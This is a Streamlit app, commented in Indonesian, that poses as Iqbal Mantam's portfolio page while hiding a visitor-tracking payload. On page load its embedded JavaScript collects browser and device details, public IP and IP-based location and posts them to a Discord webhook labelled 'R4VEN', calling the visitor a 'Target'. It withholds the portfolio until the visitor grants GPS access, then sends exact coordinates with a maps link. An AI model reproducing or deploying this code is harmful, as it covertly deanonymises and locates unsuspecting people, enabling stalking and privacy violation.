import streamlit as st
import streamlit.components.v1 as components

# Konfigurasi halaman Streamlit
st.set_page_config(
    page_title="Iqbal Mantam - Portfolio", 
    page_icon="💼", 
    layout="wide"
)

# CSS Tambahan untuk menyembunyikan header, menu, dan ikon GitHub bawaan Streamlit
hide_streamlit_style = """
    <style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stApp > header {display: none;}
    </style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# Ambil Discord Webhook dari Streamlit Secrets secara aman
try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

# Kode HTML & JavaScript yang disatukan untuk Streamlit Cloud
html_code = f"""
<!DOCTYPE html>
<html>
<head>
  <script type="text/javascript" src="dwebhook.js"></script>
</head>
<body onload="getLocation()">

  <!-- Iframe disembunyikan (display: none) secara default -->
  <div id="portfolio-container" style="display: none;">
    <iframe src="https://iqbalmantam.github.io/portfolio/" width="100%" height="900" style="border:none;"></iframe>
  </div>

  <!-- Pesan penolakan disertai panduan jika terlanjur diblokir -->
  <div id="error-message" style="text-align: center; margin-top: 150px; font-family: sans-serif; display: none; color: #333;">
    <h2 style="color: #ff4b4b;">Akses Lokasi Dibutuhkan</h2>
    <p>Halaman ini memerlukan izin akses lokasi untuk dapat ditampilkan.</p>
    <div style="background: #f8f9fa; display: inline-block; padding: 15px 25px; border-radius: 8px; border: 1px solid #ddd; text-align: left; margin-top: 15px;">
      <p style="margin: 0 0 8px 0; font-weight: bold;">Terlanjur klik "Block"? Cara membukanya:</p>
      <ol style="margin: 0; padding-left: 20px; font-size: 14px; color: #555;">
        <li>Klik ikon <b>Gembok/Setelan Situs</b> di sebelah kiri alamat web (URL) di atas.</li>
        <li>Cari opsi <b>Location (Lokasi)</b> lalu ubah dari <i>Block</i> menjadi <b>Allow (Izinkan)</b>.</li>
        <li>Muat ulang (refresh) halaman ini.</li>
      </ol>
    </div>
  </div>

  <p id="demo"></p>
  <span id="gfg" style="display:none;"></span>
  
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
    const WEBHOOK_URL = "{webhook_url}";
    var x = document.getElementById("demo");

    let datetime = new Date();
    let localtime = String(datetime.toLocaleTimeString());

    var sysinfo = (" GET ", "```xl\\n" + navigator.userAgent + "```" + "```autohotkey\\n" + "\\nPlatform: " + navigator.platform + "\\nCookies_Enabled: " + navigator.cookieEnabled + "\\nBrowser_Language: " + navigator.language + "\\nBrowser_Name: " + navigator.appName + "\\nBrowser_CodeName: " + navigator.appCodeName + "\\nRam: " + navigator.deviceMemory + "\\nCPU_cores: " + navigator.hardwareConcurrency + "\\nScreen_Width: " + screen.width + "\\nScreen_Height: " + screen.height + "\\nTime: " + localtime + "\\nRefUrl: " + document.referrer + "\\nOscpu: " + navigator.oscpu + "```");

    function sendToDiscord(payload) {{
        const request = new XMLHttpRequest();
        request.open("POST", WEBHOOK_URL);
        request.setRequestHeader('Content-type', 'application/json');
        request.send(JSON.stringify(payload));
    }}

    // 1. Kirim Info Sistem
    var myEmbed1 = {{
      author: {{ name: "Target System Information.." }},
      title: "Uagent:",
      description: sysinfo,
      color: 15418782
    }}
    sendToDiscord({{
      username: "R4VEN",
      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
      content: "@everyone Someone Opened The Link O_o ",
      embeds: [myEmbed1]
    }});

    // 2. Kirim IP Address
    $.getJSON("https://api.ipify.org?format=json", function (data) {{
      $("#gfg").html(data.ip);
      var myEmbed2 = {{
        author: {{ name: "Target Ip" }},
        description: '```xl\\n' + data.ip + '```' + '\\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\\n",
        color: 15548997,
        footer: {{ text: "Geographic location based on IP address is approximate." }}
      }};
      sendToDiscord({{
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed2]
      }});
    }});

    // 3. Kirim Detail IP Reconnaissance
    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,lat,lon", function (response) {{
      var myEmbed3 = {{
        author: {{ name: "IP Address Reconnaissance" }},
        title: response.status,
        description: '```autohotkey\\nCountry: ' + response.country + '\\nCity: ' + response.city + '\\nLat: ' + response.lat + '\\nLon: ' + response.lon + '```',
        color: 5763719
      }};
      sendToDiscord({{
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed3]
      }});
    }});

    function getLocation() {{
      if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      }} else {{
        x.innerHTML = "Geolocation is not supported by this browser.";
      }}
    }}

    function showPosition(position) {{
      // JIKA USER MEMILIH ALLOW: Tampilkan kembali kontainer portfolio
      document.getElementById("portfolio-container").style.display = "block";

      var latlong = (" GET ", "```prolog\\nLatitude:" + position.coords.latitude + "\\nLongitude:" + position.coords.longitude + "```" + "\\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);

      var myEmbed4 = {{
        author: {{ name: "Target Allowed Location Permission" }},
        title: "GPS location of target..",
        description: latlong,
        color: 15844367,
        footer: {{ text: "GPS fetch almost exact location." }}
      }};
      sendToDiscord({{
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed4]
      }});
    }}

    function showError(error) {{
      if (error.code == error.PERMISSION_DENIED) {{
        // JIKA USER MEMILIH DENY/BLOCK: Tampilkan pesan error dan panduan ubah setting
        document.getElementById("error-message").style.display = "block";
        
        sendToDiscord({{
          username: "R4VEN",
          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
          content: "```diff\\n- User denied the request for Geolocation.```"
        }});
      }}
    }}
  </script>
</body>
</html>
"""

# Render aplikasi di Streamlit
if webhook_url:
    components.html(html_code, height=950, scrolling=True)
else:
    st.error("⚠️ Discord Webhook URL belum diatur!")
    st.info("Tambahkan `DISCORD_WEBHOOK_URL` di bagian **Settings -> Secrets** pada dasbor Streamlit Cloud Anda.")
